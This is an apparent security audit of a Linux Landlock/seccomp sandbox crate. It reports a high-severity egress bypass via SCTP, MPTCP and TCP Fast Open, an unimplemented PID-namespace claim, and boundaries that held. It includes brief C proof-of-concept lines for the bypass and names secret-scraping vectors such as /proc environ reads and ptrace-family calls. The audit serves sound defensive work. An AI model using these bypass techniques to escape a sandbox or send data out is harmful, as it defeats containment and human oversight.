# Linux sandbox confinement audit (Landlock + seccomp)

Security audit of `crates/nub-sandbox` Linux enforcement. Every hole below was
REPRODUCED against the real backend on a real-kernel VM — not inferred from source.
This doc is the auditable catalog (all buckets: real gaps / confirmed-solid /
not-reproduced), per the audit-thread methodology.

## Method / environment (pinned)

- **VM:** Lima `landlock-vm`, Ubuntu 24.04, **kernel 6.8.0-117-generic**, Landlock
  **ABI v4**, seccomp present.
- **VM config that shaped the tests:** `kernel.yama.ptrace_scope=1` (Ubuntu default),
  `kernel.unprivileged_userns_clone=1` (userns available), `net.mptcp.enabled=1`
  (MPTCP default-on), `sctp` module present (autoloads on first SCTP socket).
- **How the real backend was driven:** the built `nub run --sandbox <policy.json>
  <program> [args]` seam → top-level `nub_sandbox::apply()` → `linux::apply` (starts
  the egress proxy for a per-host policy, installs NNP → Landlock → seccomp in the
  child's `pre_exec`). Attack payloads are small C programs (a stand-in for a
  malicious dependency's native addon — squarely in the stated threat model, since an
  in-process JS hook is explicitly "theater" and the boundary is the OS layer).
- **PoC artifacts:** `~/audit/*.c` + `*.json` on the VM. Each net probe distinguishes
  `EACCES/EPERM` (sandbox blocked) from a completed/refused connection (egress
  allowed) via exit code, and pairs every positive with a control.

## Claim being audited (arch doc §5/§6 + LIMITATIONS.md)

- **net:** "The boundary is the OS layer denying **all** direct egress, so the only
  reachable destination is a nub-run localhost proxy." The ONLY documented net
  residual is the port-scoped `ConnectTcp` one: a TCP connect to an external host that
  happens to listen on the *random proxy port*.
- **env-read:** `/proc` is never granted (closes `/proc/<ppid>/environ`) + seccomp
  denies the ptrace family (`ptrace`/`process_vm_readv`/`process_vm_writev`);
  inherited + unsheddable under `no_new_privs`; explicitly "cannot rely on the host's
  `yama.ptrace_scope`."
- **pid:** "PID-namespace isolation is opportunistic defense-in-depth where a user
  namespace is available."

---

## FINDING 1 — Per-host egress boundary bypassed by SCTP, MPTCP, and TCP Fast Open

**Severity: HIGH. Confidence: HIGH. NEW (not the documented `ConnectTcp` residual).**

In **Proxy mode** (any per-host allow, e.g. `{"net":["example.com"]}`), a sandboxed
process reaches **any host on any port** — three reproduced vectors, all confirmed
reaching a live listener on the VM's eth0 IP `192.168.5.15` and the gateway
`192.168.5.2`, on **non-proxy** ports (so it is not the documented port-scoped
residual, which is limited to the proxy's own random port):

```
CONTROL plain TCP  socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)+connect  → EACCES   (Landlock ConnectTcp blocks correctly — proves enforcement is LIVE)
        SCTP       socket(AF_INET,SOCK_STREAM,IPPROTO_SCTP)+connect  → connect OK  → EGRESS
        MPTCP      socket(AF_INET,SOCK_STREAM,IPPROTO_MPTCP)+connect → connect OK  → EGRESS
        TFO        socket(AF_INET,SOCK_STREAM,0)+sendto(...,MSG_FASTOPEN,dest)
                     → peer logged: ACCEPTED ('192.168.5.15',34024) data=b'hey'   → EGRESS + data exfil, NO connect() syscall
```

**Root cause.** The Proxy-mode net boundary = Landlock `ConnectTcp` (pins the
`connect()` destination *port* to the proxy) + a seccomp filter narrowing `AF_INET` to
`SOCK_STREAM`. Two structural gaps:
1. Landlock `ConnectTcp` governs only `IPPROTO_TCP`, and the seccomp `socket()` filter
   checks the domain (arg0) and type (arg1) but leaves the **protocol (arg2)
   unchecked** — so `SOCK_STREAM` sockets with `IPPROTO_SCTP` / `IPPROTO_MPTCP` pass
   `socket()` and are not governed by the TCP-only connect hook.
2. **TCP Fast Open** initiates the connection inside `sendto`/`sendmsg` with
   `MSG_FASTOPEN` — there is **no `connect()` syscall to hook at all**. This works for
   plain `IPPROTO_TCP`.

No `Degradation` is reported — the backend claims **full** net enforcement while this
class of egress is open.

**Why HIGH.** It falsifies the core net claim for per-host mode: arbitrary
exfiltration destination, defeating the per-host allowlist entirely. **MPTCP is the
headline** — default-on, needs no module, and transparently falls back to plain TCP
against any ordinary TCP server, i.e. a drop-in replacement for a normal outbound TCP
connection. Coarse deny-all (`{"net":false}`) is SOLID (AF_INET incl. SCTP/MPTCP
denied at `socket()`); the bypass is specific to **per-host / proxy** mode — exactly
where a per-host allowlist is the product promise.

**Decision-record cross-check.** LIMITATIONS.md §Network documents only the
port-scoped `ConnectTcp` TCP residual (external host on the random proxy port) and the
bind-less `listen()` autobind. Neither covers a non-TCP stream protocol nor the
connect-less TFO path; these reach any port, not the proxy port. Genuinely new.

**Interaction with the in-progress `connect()` USER_NOTIF fix (a real GAP to flag):**
- SCTP one-to-one and MPTCP both use `connect()` → the fix **closes them IFF the
  supervisor traps `connect()` protocol-agnostically** (not gated on socket
  type/protocol). Must be verified.
- **TFO has no `connect()` syscall → it survives a `connect()`-only USER_NOTIF.** A
  companion control is required: seccomp-deny the `MSG_FASTOPEN` flag (bit
  `0x20000000`) on `sendto`/`sendmsg`/`sendmmsg`, or have the supervisor also mediate
  those sends. (SCTP one-to-many auto-connect-on-`sendmsg` is already closed — its
  `SOCK_SEQPACKET` type is denied by the existing type filter.)

**PoC** (`~/audit/c.c`, `tfo.c` on the VM; policy `~/audit/proxy.json` =
`{"net":["example.com"]}`):

```c
// c.c — SCTP/MPTCP/TCP stream connect. proto = IPPROTO_SCTP | IPPROTO_MPTCP | IPPROTO_TCP.
int fd = socket(AF_INET, SOCK_STREAM, proto);
connect(fd, dest, sizeof dest);        // exit 0 = egress, 42 = EACCES/EPERM
// tfo.c — connect-less egress:
int fd = socket(AF_INET, SOCK_STREAM, 0);
sendto(fd, "hey", 3, MSG_FASTOPEN, dest, sizeof dest);   // reaches an external peer with data
```

---

## FINDING 2 — Opportunistic PID-namespace isolation is claimed but not implemented

**Severity: LOW. Confidence: HIGH.**

Arch §5 states PID-namespace isolation is "opportunistic defense-in-depth where a user
namespace is available." In fact `backend/linux.rs` contains **zero** PID-ns code and
`PidPolicy.isolate` is **never read** by any backend (grep-confirmed). userns IS
available on this VM, so the "opportunistic where available" layer would apply but does
nothing.

Not an exposure — the real env-read boundary (Landlock `/proc` close + seccomp) holds
independently (see below) — but the doc overstates the defense. Fix: implement it, or
drop the claim / align the arch doc with LIMITATIONS.md and the code.

---

## Confirmed SOLID (negative results — the boundary holds)

- **Env-read boundary is robust across every scrape vector, even under adversarial
  `yama.ptrace_scope=0`:** `/proc/<ppid>/environ`, `/proc/<ppid>/mem`,
  `/proc/self/environ` → `EACCES` (Landlock never grants `/proc`);
  `process_vm_readv(parent)`, `ptrace(PTRACE_ATTACH, parent)`,
  `pidfd_getfd(parent, fd)` → `EPERM`. The seccomp denies are genuinely
  yama-independent (tested with yama forced to 0). (`~/audit/envrb.c`, `envrb2.c`.)
- **userns procfs-remount to re-expose the ancestor's environ → BLOCKED.** A child that
  `unshare(CLONE_NEWUSER|CLONE_NEWNS)`s then tries to `mount -t proc` inside its
  granted tree cannot configure the userns, because the `/proc` close ALSO denies
  `/proc/self/uid_map` + `/proc/self/setgroups` → `mount proc` fails `EPERM`. This
  incidentally forecloses the "in-sandbox self-service" version of the documented
  bind-mounted-procfs residual, so LIMITATIONS.md's "requires prior privilege/setup"
  is accurate, not understated. (`~/audit/remount.c`.)
- **fs read/write confine + symlink and `..` escapes → denied** (Landlock keys on the
  resolved inode; a link/`..` to an ungranted secret is not in the grant set).
- **io_uring** `io_uring_setup` → `EPERM` whenever net is enforced (Proxy AND
  deny-all); available only when net is Off — fine, because Landlock still governs fs
  and there is no net restriction to bypass. (`~/audit/iou.c`.)
- **Read-grant budget overflow → fail-SAFE** (unwalked remainder left ungranted =
  denied) AND honestly reported: a generous-`**`-over-`/` policy surfaced
  `warning: sandbox running in reduced mode — fs-read-partial not enforced (... remainder denied)`.
- **Coarse net deny-all** (`{"net":false}`) denies `socket(AF_INET, ...)` outright,
  including SCTP/MPTCP.

## Not reproduced (noted, not surfaced as findings)

- **`pidfd_getfd` fd-theft** — not in the seccomp deny-list, and the module header's
  "can't rely on yama" logic would suggest it should be. But it is **blocked even at
  `yama=0`** (returns `EPERM`), so no bypass was reproducible. A hardening-completeness
  note at most; also a weak env vector (it steals an fd, not env, and the parent holds
  no secret-bearing fd).
- **i386 multiplexed `socketcall` / x32 ABI** — not testable on the aarch64 VM. The
  code relies on seccompiler emitting `SECCOMP_RET_KILL_PROCESS` on a foreign-ABI
  syscall, which by inspection prevents a compat-ABI socket from slipping the
  single-arch filter. Reasoned-OK, unverified on this arch.

## Changelog
- 2026-07-09 — Initial write-up. FINDING 1 (SCTP/MPTCP/TFO per-host egress bypass,
  HIGH) and FINDING 2 (PID-ns claimed-not-implemented, LOW) reproduced on
  `landlock-vm`; env-read + fs boundaries confirmed solid, including under `yama=0`.
